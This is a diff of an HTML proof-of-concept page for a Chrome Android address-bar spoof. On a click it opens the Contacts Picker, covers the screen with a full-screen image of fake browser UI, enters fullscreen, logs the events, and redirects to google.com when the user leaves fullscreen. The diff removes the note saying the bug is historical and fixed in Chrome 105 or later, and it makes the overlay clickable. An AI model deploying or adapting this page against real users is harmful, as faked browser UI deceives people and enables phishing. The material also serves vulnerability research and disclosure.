@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+  <title>Security UI Spoof</title>
   <meta charset="utf-8">
-  <title>Chrome Android UI Spoof – Historical PoC</title>
   <meta name="viewport"
-        content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+        content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
 
   <style>
     html, body {
@@ -17,17 +17,6 @@
       overflow: hidden;
     }
 
-    #content {
-      position: absolute;
-      inset: 0;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: #fff;
-      text-align: center;
-      z-index: 1;
-    }
-
     #spoof {
       position: fixed;
       inset: 0;
@@ -36,61 +25,89 @@
       object-fit: cover;
       display: none;
       z-index: 9999;
-      pointer-events: none;
     }
 
-    #note {
-      position: fixed;
-      bottom: 10px;
-      left: 0;
-      right: 0;
-      font-size: 12px;
+    #content {
+      position: absolute;
+      inset: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
       text-align: center;
-      opacity: .6;
     }
   </style>
 </head>
 
 <body>
 
-<img id="spoof" src="spof2.png" alt="spoofed ui">
+<img id="spoof" src="spof2.png" alt="spoof">
 
 <div id="content">
-  <h1>Click anywhere to continue</h1>
-</div>
-
-<div id="note">
-  Historical PoC – fixed in Chrome ≥105
+  <h1>Click anywhere on the page to spoof the omnibox!</h1>
 </div>
 
 <script>
+let enteredFullscreen = false;
+
+/* 🧾 Simple logger */
+function logEvent(type, data = {}) {
+  const logs = JSON.parse(localStorage.getItem('poc_logs') || '[]');
+  logs.push({
+    time: new Date().toISOString(),
+    type,
+    ...data
+  });
+  localStorage.setItem('poc_logs', JSON.stringify(logs));
+  console.log('[LOG]', type, data);
+}
+
 document.addEventListener('click', async () => {
 
-  /* 1️⃣ Contacts Picker (user gesture) */
+  /* 1️⃣ Call Contacts Picker */
   if (navigator.contacts && navigator.contacts.select) {
+    logEvent('contacts_picker_called');
+
     navigator.contacts.select(["name"], {})
-      .catch(() => {});
+      .then(result => {
+        logEvent('contacts_picker_closed', {
+          granted: true,
+          count: result.length
+        });
+      })
+      .catch(err => {
+        logEvent('contacts_picker_closed', {
+          granted: false,
+          reason: err.name
+        });
+      });
+  } else {
+    logEvent('contacts_api_not_supported');
   }
 
-  /* 2️⃣ Request fullscreen */
-  if (document.documentElement.requestFullscreen) {
-    document.documentElement.requestFullscreen()
-      .catch(() => {});
-  }
-
-  /* 3️⃣ Visual spoof overlay */
+  /* 2️⃣ Show spoof */
   document.getElementById('spoof').style.display = 'block';
   document.getElementById('content').style.display = 'none';
 
+  /* 3️⃣ Enter fullscreen */
+  if (document.documentElement.requestFullscreen) {
+    try {
+      await document.documentElement.requestFullscreen();
+      enteredFullscreen = true;
+      logEvent('entered_fullscreen');
+    } catch (e) {
+      logEvent('fullscreen_failed', { error: e.message });
+    }
+  }
+
 }, { once: true });
 
-/* Observability for reports */
+/* 🔁 Exit fullscreen → redirect */
 document.addEventListener('fullscreenchange', () => {
-  console.log('fullscreen:', !!document.fullscreenElement);
-});
-
-document.addEventListener('visibilitychange', () => {
-  console.log('visibility:', document.visibilityState);
+  if (enteredFullscreen && !document.fullscreenElement) {
+    logEvent('exit_fullscreen_redirect');
+    location.href = 'https://google.com';
+  }
 });
 </script>
 
